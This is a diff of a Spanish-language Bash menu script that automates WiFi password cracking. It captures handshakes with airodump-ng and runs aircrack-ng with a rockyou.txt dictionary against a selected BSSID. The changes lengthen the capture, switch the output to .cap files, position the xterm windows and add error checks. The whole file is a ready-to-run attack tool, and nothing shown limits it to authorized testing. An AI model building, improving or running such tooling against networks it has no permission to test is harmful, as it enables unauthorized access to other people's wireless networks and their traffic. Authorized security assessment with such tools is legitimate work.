@@ -14,7 +14,7 @@ PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
 DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")
 
-# Función para verificar e instalar dependencias
+# Verificar e instalar dependencias
 install_dependencies() {
     dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
     for dep in "${DEPENDENCIES[@]}"; do
@@ -34,14 +34,25 @@ prepare_project_directory() {
     mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
 }
 
-# Escaneo en vivo de redes WiFi
+# Escaneo en vivo de redes WiFi con ventana posicionada
 live_scan_networks() {
     local interface=$(detect_wireless_interface)
+    if [[ -z "$interface" ]]; then
+        dialog --title "Error" --msgbox "No se encontró una interfaz inalámbrica compatible." 8 40
+        return
+    fi
+
     dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
-    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" &
-    sleep 10
+    xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/live_scan" &
+    sleep 60
     killall airodump-ng
-    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
+
+    if [[ ! -f "$RESULTS_DIR/live_scan-01.cap" ]]; then
+        dialog --title "Error" --msgbox "El archivo live_scan-01.cap no se generó. Verifica el proceso de escaneo." 8 40
+        return
+    fi
+
+    show_scan_results "$RESULTS_DIR/live_scan-01.cap"
 }
 
 # Mostrar resultados del escaneo en vivo
@@ -108,7 +119,7 @@ perform_attack() {
     local dictionary=$(find_or_download_dictionary)
 
     dialog --title "Ataque" --infobox "Iniciando ataque contra $bssid..." 8 40
-    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
+    xterm -geometry 80x24+0+0 -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
 }
 
 # Buscar o descargar diccionario rockyou.txt
@@ -135,7 +146,7 @@ main_menu() {
         case $option in
             1) install_dependencies ;;
             2) live_scan_networks ;;
-            3) show_scan_results "$RESULTS_DIR/live_scan-01.csv" ;;
+            3) show_scan_results "$RESULTS_DIR/live_scan-01.cap" ;;
             4) clear; exit 0 ;;
             *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
         esac
